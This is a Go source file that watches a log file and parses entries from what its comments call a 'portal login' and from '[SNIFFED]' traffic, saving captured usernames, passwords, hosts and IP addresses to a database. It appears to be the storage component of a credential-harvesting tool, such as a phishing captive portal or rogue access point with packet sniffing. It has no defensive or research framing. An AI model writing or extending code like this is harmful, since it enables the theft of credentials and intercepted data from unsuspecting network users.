package services

import (
	"bufio"
	"io"
	"log"
	"os"
	"strings"
	"time"
)

func StartLogWatcher(logPath string) {
	go func() {
		var lastOffset int64 = 0

		// Initial check to skip existing entries or start from beginning
		if file, err := os.Open(logPath); err == nil {
			if info, err := file.Stat(); err == nil {
				lastOffset = info.Size()
			}
			file.Close()
		}

		ticker := time.NewTicker(1 * time.Second)
		for range ticker.C {
			file, err := os.Open(logPath)
			if err != nil {
				continue
			}

			info, err := file.Stat()
			if err != nil {
				file.Close()
				continue
			}

			if info.Size() > lastOffset {
				_, err = file.Seek(lastOffset, io.SeekStart)
				if err != nil {
					file.Close()
					continue
				}

				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					line := scanner.Text()
					parseAndSaveLog(line)
				}
				lastOffset = info.Size()
			}
			file.Close()
		}
	}()
}

func parseAndSaveLog(line string) {
	// Format: login=XXX password=YYY ip=ZZZ os=...
	// Or: ip=ZZZ [SNIFFED] Host: AAA | Data: BBB

	if strings.Contains(line, "[SNIFFED]") {
		// Handle sniffed data
		parts := strings.Split(line, "[SNIFFED]")
		ipPart := strings.TrimSpace(strings.Replace(parts[0], "ip=", "", 1))

		dataParts := strings.Split(parts[1], "|")
		if len(dataParts) >= 2 {
			host := strings.TrimPrefix(strings.TrimSpace(dataParts[0]), "Host: ")
			data := strings.TrimPrefix(strings.TrimSpace(dataParts[1]), "Data: ")
			_ = SaveCredential("SNIFFED@"+host, data, ipPart)
		}
		return
	}

	// Handle portal login
	fields := make(map[string]string)
	parts := strings.Fields(line)
	for _, p := range parts {
		kv := strings.SplitN(p, "=", 2)
		if len(kv) == 2 {
			fields[kv[0]] = kv[1]
		}
	}

	login := fields["login"]
	password := fields["password"]
	ip := fields["ip"]
	if login != "" && password != "" {
		err := SaveCredential(login, password, ip)
		if err != nil {
			log.Printf("Error saving credential to DB: %v", err)
		}
	}
}
